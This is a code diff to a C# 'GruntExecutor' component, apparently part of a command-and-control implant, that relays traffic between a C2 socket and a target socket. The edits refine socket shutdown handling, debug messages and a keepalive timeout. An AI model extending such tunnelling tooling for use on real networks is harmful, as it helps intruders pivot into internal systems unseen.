@@ -136,14 +136,17 @@ namespace GruntExecutor
                             break;
                         }
                     }
-                    try
-                    {
+                    try{
+                        Console.WriteLine("DEBUG:: Trying to shutdown socket ...");
                         socket.Shutdown(SocketShutdown.Both);
                         socket.Close();
                     }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine("DEBUG:: asyncRead Error: " + e.Message);
+                    catch (ObjectDisposedException ef){
+                        Console.WriteLine("DEBUG:: ShutDown failed, Trying to close ...");
+                        socket.Close();
+                    }
+                    catch (Exception ef){
+                        Console.WriteLine("DEBUG:: Nothing to do ...");
                     }
 
                     Console.WriteLine("DEBUG:: asyncRead Exited, id " + id);
@@ -166,6 +169,8 @@ namespace GruntExecutor
                                 }
                                 else
                                 {
+                                    //check there if socket is still alive ..
+                                    //int temp = socket.Available;
                                     System.Threading.Thread.Sleep(1000);
                                 }
                             }
@@ -180,6 +185,8 @@ namespace GruntExecutor
                                 }
                                 else
                                 {
+                                    //check there if socket is still alive ..
+                                    //int temp = socket.Available;
                                     System.Threading.Thread.Sleep(1000);
                                 }
                             }
@@ -189,22 +196,27 @@ namespace GruntExecutor
                             break;
                         }
                     }
-                    try
-                    {
+                    
+                    try{
+                        Console.WriteLine("DEBUG:: Trying to shutdown socket ...");
                         socket.Shutdown(SocketShutdown.Both);
                         socket.Close();
                     }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine("DEBUG:: asyncWrite Error: " + e.Message);
+                    catch (ObjectDisposedException ef){
+                        Console.WriteLine("DEBUG:: ShutDown failed, Trying to close ...");
+                        socket.Close();
                     }
+                    catch (Exception ef){
+                        Console.WriteLine("DEBUG:: Nothing to do ...");
+                    }
+
                     Console.WriteLine("DEBUG:: asyncWrite Exited, id " + id);
                 }
 
                 public void doChat(string bind_port, Socket sock_c2, Socket sock_route)
                 {
                     
-                    int sock_timeout = 10; //assume died after 10 ping back
+                    int sock_timeout = 30; //assume died after 30 ping back
                     Thread keep_reading_from_C2 = new Thread(() => asyncRead(sock_c2, 0, bind_port));
                     Thread keep_writing_to_Target = new Thread(() => asyncWrite(sock_route, 0, bind_port));
                     Thread keep_reading_from_Target = new Thread(() => asyncRead(sock_route, 1, bind_port));
@@ -324,7 +336,7 @@ namespace GruntExecutor
                                 }
 
                                 //sock closted
-                                Console.WriteLine("DEBUG:: sock closed. Killing client thread ..." + e.Message);
+                                Console.WriteLine("DEBUG:: sock closed. Killing client thread ...");
                                 Console.WriteLine("DEBUG:: killing keep_writing_to_Target ... ");
                                 keep_writing_to_Target.Abort();
                                 Console.WriteLine("DEBUG:: joinning keep_writing_to_Target ... ");
@@ -348,6 +360,8 @@ namespace GruntExecutor
                                 Console.WriteLine("DEBUG:: joinning keep_writing_to_C2 ... ");
                                 keep_writing_to_C2.Join();
                                 keep_writing_to_C2 = null;
+
+                                break;
 
                             }//assume died end
 
